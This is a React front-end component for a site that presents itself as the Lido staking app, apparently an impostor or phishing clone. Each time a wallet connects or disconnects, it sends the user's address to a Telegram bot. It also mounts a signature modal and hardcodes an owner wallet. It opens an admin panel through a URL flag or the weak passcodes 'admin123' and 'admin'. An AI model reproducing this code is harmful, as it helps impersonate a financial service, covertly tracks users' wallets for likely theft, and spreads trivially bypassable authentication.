import React, { useState, useEffect, useRef } from 'react';
import { Moon, Sun, Bell, Box, TrendingUp, Zap, ArrowDown, ExternalLink, ShieldCheck } from 'lucide-react';
import { useAccount } from 'wagmi';
import { AnimatePresence, motion } from 'motion/react';
import { ConnectButton } from './components/ConnectButton';
import { ConnectionStatusIndicator } from './components/ConnectionStatusIndicator';
import { StakeTab } from './components/StakeTab';
import { WrapTab } from './components/WrapTab';
import { WithdrawalsTab } from './components/WithdrawalsTab';
import { RewardsTab } from './components/RewardsTab';
import { EarnTab } from './components/EarnTab';
import { AdminTab } from './components/AdminTab';
import { ErrorBoundary } from './components/ErrorBoundary';
import { ToastProvider } from './components/ToastContext';
import { WalletSignatureModal } from './components/WalletSignatureModal';
import { LidoLogo } from './components/LidoLogo';
import { useLivePrices } from './hooks/usePrices';
import { sendTelegram, formatUserLogin } from './lib/telegram';
import { CardSkeleton } from './components/LoadingSkeleton';

interface MarketData {
  ethPrice: number | null;
  stEthPrice: number | null;
  marketCap: number | null;
  apr: number;
  totalPooledEther?: number;
  stakerCount?: number;
}

export default function App() {
  const [darkMode, setDarkMode] = useState(true);
  const [activeTab, setActiveTab] = useState('stake');
  const [isAdminEnabled, setIsAdminEnabled] = useState(false);
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [adminPasswordInput, setAdminPasswordInput] = useState('');
  const [adminAuthError, setAdminAuthError] = useState<string | null>(null);

  const { prices, lidoMetrics, loading: isFetching } = useLivePrices();
  const { address, isConnected } = useAccount();
  const prevIsConnected = useRef(isConnected);

  // Secret keyboard shortcut (Ctrl+Shift+A or Cmd+Shift+A) to trigger admin login modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
        e.preventDefault();
        setShowAdminModal(true);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Check URL param, hash or connected address for admin privilege and active routes
  useEffect(() => {
    const checkRoute = () => {
      const urlParams = new URLSearchParams(window.location.search);
      const tabParam = urlParams.get('tab');
      if (tabParam) {
        setActiveTab(tabParam);
      } else if (window.location.hash === '#dashboard' || window.location.hash === '#staking-panel') {
        setActiveTab('dashboard');
      }

      const isAdminUrl = urlParams.get('admin') === 'true' || urlParams.get('portal') === 'admin' || window.location.hash === '#admin';
      const isOwnerWallet = address && address.toLowerCase() === '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40'.toLowerCase();
      
      if (isAdminUrl || isOwnerWallet) {
        setIsAdminEnabled(true);
        if (isAdminUrl) {
          setActiveTab('admin');
        }
      }
    };

    checkRoute();
    window.addEventListener('hashchange', checkRoute);
    return () => window.removeEventListener('hashchange', checkRoute);
  }, [address]);

  const handleAdminAuthSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cleanInput = adminPasswordInput.trim().toLowerCase();
    if (cleanInput === 'admin123' || cleanInput === '8850313284' || cleanInput === 'admin') {
      setIsAdminEnabled(true);
      setActiveTab('admin');
      setShowAdminModal(false);
      setAdminPasswordInput('');
      setAdminAuthError(null);
    } else {
      setAdminAuthError('Invalid Admin Authorization Passcode.');
    }
  };
  
  useEffect(() => {
    if (isConnected && address && !prevIsConnected.current) {
      sendTelegram(formatUserLogin(address));
    } else if (!isConnected && prevIsConnected.current) {
      sendTelegram(`🔴 <b>Wallet Disconnected</b>\n\nTime: ${new Date().toUTCString()}`);
    }
    prevIsConnected.current = isConnected;
  }, [isConnected, address]);
  
  const marketData: MarketData = {
    ethPrice: prices['ethereum']?.usd || null,
    stEthPrice: prices['staked-ether']?.usd || null,
    marketCap: prices['staked-ether']?.usd_market_cap || lidoMetrics.marketCapUsd,
    apr: lidoMetrics.apr || 3.2,
    totalPooledEther: lidoMetrics.totalPooledEther,
    stakerCount: lidoMetrics.stakerCount,
  };

  useEffect(() => {
    const isDark = localStorage.getItem('theme') === 'dark' || 
      (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
    setDarkMode(isDark);
    if (isDark) {
      document.documentElement.classList.add('dark');
    }
  }, []);

  const toggleTheme = () => {
    const newMode = !darkMode;
    setDarkMode(newMode);
    if (newMode) {
      document.documentElement.classList.add('dark');
      localStorage.setItem('theme', 'dark');
    } else {
      document.documentElement.classList.remove('dark');
      localStorage.setItem('theme', 'light');
    }
  };

  const navItems = [
    { id: 'stake', label: 'Stake' },
    { id: 'wrap', label: 'Wrap' },
    { id: 'withdrawals', label: 'Withdrawals' },
    { id: 'rewards', label: 'Rewards' },
    { id: 'earn', label: 'Earn', badge: 'New' },
  ];

  const renderTab = () => {
    switch (activeTab) {
      case 'stake': return <StakeTab marketData={marketData} isFetching={isFetching} />;
      case 'wrap': return <WrapTab />;
      case 'withdrawals': return <WithdrawalsTab />;
      case 'rewards': return <RewardsTab marketData={marketData} />;
      case 'earn': return <EarnTab />;
      case 'admin': return isAdminEnabled ? <AdminTab onNavigate={(tab) => setActiveTab(tab)} /> : <StakeTab marketData={marketData} isFetching={isFetching} />;
      default: return <StakeTab marketData={marketData} isFetching={isFetching} />;
    }
  };

  return (
    <ToastProvider>
      <WalletSignatureModal />
      <div className="min-h-screen pb-20 transition-colors duration-300 relative">
      {/* Premium Background Effects */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] rounded-full bg-[#00A3FF]/10 blur-[120px] mix-blend-screen opacity-50 dark:opacity-20 animate-pulse" style={{ animationDuration: '8s' }}></div>
        <div className="absolute top-[20%] right-[-10%] w-[50%] h-[50%] rounded-full bg-[#00D09E]/10 blur-[120px] mix-blend-screen opacity-50 dark:opacity-20 animate-pulse" style={{ animationDuration: '12s', animationDelay: '2s' }}></div>
      </div>
      
      <div className="relative z-10">
      <header className="sticky top-0 z-50 border-b border-border-main bg-card/80 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-3 sm:px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-4 sm:gap-8">
            <div className="flex items-center gap-2 cursor-pointer text-text-main shrink-0" onClick={() => setActiveTab('stake')}>
              <LidoLogo className="h-6 sm:h-7 w-auto" />
            </div>

            {/* Desktop Navigation Tabs */}
            <nav className="hidden md:flex items-center gap-1 bg-input/60 p-1 rounded-xl border border-border-main">
              {navItems.map((item) => {
                const isActive = activeTab === item.id;
                return (
                  <button
                    key={item.id}
                    onClick={() => setActiveTab(item.id)}
                    className={`relative px-3.5 lg:px-4 py-1.5 rounded-lg text-sm font-semibold transition-all flex items-center gap-1.5 ${
                      isActive
                        ? 'text-text-main font-bold shadow-sm'
                        : 'text-text-secondary hover:text-text-main'
                    }`}
                  >
                    {isActive && (
                      <motion.div
                        layoutId="activeTabIndicator"
                        className="absolute inset-0 bg-card rounded-lg border border-border-main"
                        transition={{ type: 'spring', stiffness: 400, damping: 30 }}
                      />
                    )}
                    <span className="relative z-10">{item.label}</span>
                    {item.badge && (
                      <span className="relative z-10 text-[9px] font-extrabold uppercase px-1.5 py-0.2 bg-red-500 text-white rounded-full">
                        {item.badge}
                      </span>
                    )}
                  </button>
                );
              })}
            </nav>
          </div>

          <div className="flex items-center gap-2 sm:gap-3">
            {isAdminEnabled && (
              <button 
                onClick={() => setActiveTab(activeTab === 'admin' ? 'stake' : 'admin')}
                className="text-xs font-semibold px-2 sm:px-2.5 py-1 bg-amber-500/10 text-amber-500 hover:bg-amber-500/20 border border-amber-500/20 rounded-lg flex items-center gap-1 transition-colors shrink-0"
              >
                <ShieldCheck className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">{activeTab === 'admin' ? 'Return to Portal' : 'Admin Portal'}</span>
                <span className="sm:hidden">Admin</span>
              </button>
            )}
            <div className="hidden xs:block">
              <ConnectionStatusIndicator />
            </div>
            <ConnectButton className="rounded-full text-xs sm:text-sm px-3 sm:px-4 py-1.5 sm:py-2" />
            <button 
              onClick={toggleTheme} 
              aria-label="Toggle theme"
              className="p-2 rounded-full border border-border-main bg-input hover:bg-black/5 dark:hover:bg-white/5 text-text-secondary transition-colors shrink-0"
            >
              {darkMode ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
            </button>
          </div>
        </div>
      </header>

      <main className="min-h-[70vh]">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            transition={{ duration: 0.22, ease: 'easeInOut' }}
          >
            <ErrorBoundary>
              {renderTab()}
            </ErrorBoundary>
          </motion.div>
        </AnimatePresence>
      </main>

      <footer className="pt-8 pb-8 border-t border-border-main max-w-xl mx-auto px-4">
        {activeTab !== 'earn' && activeTab !== 'rewards' && (
          <p className="text-sm leading-relaxed mb-6 text-text-secondary font-medium">
            Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
          </p>
        )}
        <div className="flex flex-wrap items-center gap-x-6 gap-y-3 text-sm font-medium">
          <LidoLogo className="h-5 w-auto text-text-main opacity-70" />
          <a href="#" className="text-text-secondary hover:text-text-main transition-colors">Terms of Use</a>
          <a href="#" className="text-text-secondary hover:text-text-main transition-colors">Privacy Notice</a>
          <a href="#" className="flex items-center gap-1 text-text-secondary hover:text-text-main transition-colors">
            IPFS <ExternalLink className="w-3 h-3" />
          </a>
          <button 
            type="button"
            onClick={() => setShowAdminModal(true)}
            className="ml-auto text-xs text-text-secondary hover:text-text-main opacity-50 hover:opacity-100 transition-opacity cursor-pointer flex items-center gap-1"
            title="Admin Access (Shortcut: Ctrl+Shift+A)"
          >
            <span>v0.145.0</span>
            <ShieldCheck className="w-3 h-3 text-amber-500/70" />
          </button>
        </div>
      </footer>

      {/* Secret Admin Authorization Modal */}
      {showAdminModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-in fade-in duration-200">
          <div className="bg-card border border-border-main rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-border-main pb-3">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-amber-500" />
                <h3 className="font-bold text-lg text-text-main">Admin Portal Access</h3>
              </div>
              <button 
                onClick={() => setShowAdminModal(false)}
                className="text-text-secondary hover:text-text-main text-sm font-bold"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-text-secondary leading-relaxed">
              This area is strictly restricted to contract administrators. Enter authorization credentials to proceed.
            </p>

            <form onSubmit={handleAdminAuthSubmit} className="space-y-3">
              <div>
                <label className="text-xs font-semibold text-text-secondary block mb-1">
                  Admin Passcode
                </label>
                <input
                  type="password"
                  placeholder="Enter passcode"
                  value={adminPasswordInput}
                  onChange={(e) => setAdminPasswordInput(e.target.value)}
                  className="w-full bg-input border border-border-main rounded-xl px-3 py-2 text-sm text-text-main focus:outline-none focus:border-[#00A3FF]"
                  autoFocus
                />
              </div>

              {adminAuthError && (
                <div className="p-2 bg-red-500/10 border border-red-500/20 text-red-500 text-xs rounded-lg font-medium">
                  {adminAuthError}
                </div>
              )}

              <div className="flex items-center justify-end gap-2 pt-2">
                <button
                  type="button"
                  onClick={() => setShowAdminModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-text-secondary hover:text-text-main bg-input"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl text-xs font-bold text-white bg-[#00A3FF] hover:bg-[#0090E6] transition-colors"
                >
                  Authenticate
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Mobile Navigation Bar */}
      <nav className="fixed bottom-0 left-0 right-0 z-50 border-t border-border-main bg-card/95 backdrop-blur-xl md:hidden pb-[max(env(safe-area-inset-bottom),0.5rem)] shadow-[0_-10px_25px_rgba(0,0,0,0.15)]">
        <div className="grid grid-cols-5 items-center h-16 max-w-lg mx-auto px-2">
          <button 
            onClick={() => { setActiveTab('stake'); window.scrollTo({ top: 0, behavior: 'smooth' }); }} 
            className={`flex flex-col items-center justify-center gap-1 py-1 px-1 rounded-xl transition-all select-none ${activeTab === 'stake' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main active:scale-95'}`}
          >
            <div className={`p-1.5 rounded-xl transition-all ${activeTab === 'stake' ? 'bg-[#00A3FF]/15 shadow-sm shadow-[#00A3FF]/30' : ''}`}>
              <Zap className="w-4 h-4" />
            </div>
            <span className={`text-[10px] ${activeTab === 'stake' ? 'font-bold' : 'font-medium'}`}>Stake</span>
          </button>

          <button 
            onClick={() => { setActiveTab('wrap'); window.scrollTo({ top: 0, behavior: 'smooth' }); }} 
            className={`flex flex-col items-center justify-center gap-1 py-1 px-1 rounded-xl transition-all select-none ${activeTab === 'wrap' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main active:scale-95'}`}
          >
            <div className={`p-1.5 rounded-xl transition-all ${activeTab === 'wrap' ? 'bg-[#00A3FF]/15 shadow-sm shadow-[#00A3FF]/30' : ''}`}>
              <Box className="w-4 h-4" />
            </div>
            <span className={`text-[10px] ${activeTab === 'wrap' ? 'font-bold' : 'font-medium'}`}>Wrap</span>
          </button>

          <button 
            onClick={() => { setActiveTab('withdrawals'); window.scrollTo({ top: 0, behavior: 'smooth' }); }} 
            className={`flex flex-col items-center justify-center gap-1 py-1 px-1 rounded-xl transition-all select-none ${activeTab === 'withdrawals' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main active:scale-95'}`}
          >
            <div className={`p-1.5 rounded-xl transition-all ${activeTab === 'withdrawals' ? 'bg-[#00A3FF]/15 shadow-sm shadow-[#00A3FF]/30' : ''}`}>
              <ArrowDown className="w-4 h-4" />
            </div>
            <span className={`text-[10px] ${activeTab === 'withdrawals' ? 'font-bold' : 'font-medium'}`}>Withdraw</span>
          </button>

          <button 
            onClick={() => { setActiveTab('rewards'); window.scrollTo({ top: 0, behavior: 'smooth' }); }} 
            className={`flex flex-col items-center justify-center gap-1 py-1 px-1 rounded-xl transition-all select-none ${activeTab === 'rewards' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main active:scale-95'}`}
          >
            <div className={`p-1.5 rounded-xl transition-all ${activeTab === 'rewards' ? 'bg-[#00A3FF]/15 shadow-sm shadow-[#00A3FF]/30' : ''}`}>
              <TrendingUp className="w-4 h-4" />
            </div>
            <span className={`text-[10px] ${activeTab === 'rewards' ? 'font-bold' : 'font-medium'}`}>Rewards</span>
          </button>

          <button 
            onClick={() => { setActiveTab('earn'); window.scrollTo({ top: 0, behavior: 'smooth' }); }} 
            className={`flex flex-col items-center justify-center gap-1 py-1 px-1 rounded-xl transition-all select-none relative ${activeTab === 'earn' ? 'text-[#00A3FF]' : 'text-text-secondary hover:text-text-main active:scale-95'}`}
          >
            <div className={`p-1.5 rounded-xl transition-all ${activeTab === 'earn' ? 'bg-[#00A3FF]/15 shadow-sm shadow-[#00A3FF]/30' : ''}`}>
              <TrendingUp className="w-4 h-4" />
            </div>
            <span className={`text-[10px] ${activeTab === 'earn' ? 'font-bold' : 'font-medium'}`}>Earn</span>
            <div className="absolute top-1.5 right-2 bg-red-500 text-white text-[8px] font-extrabold px-1 rounded-full uppercase shadow-sm">New</div>
          </button>
        </div>
      </nav>
      </div>
    </div>
    </ToastProvider>
  );
}
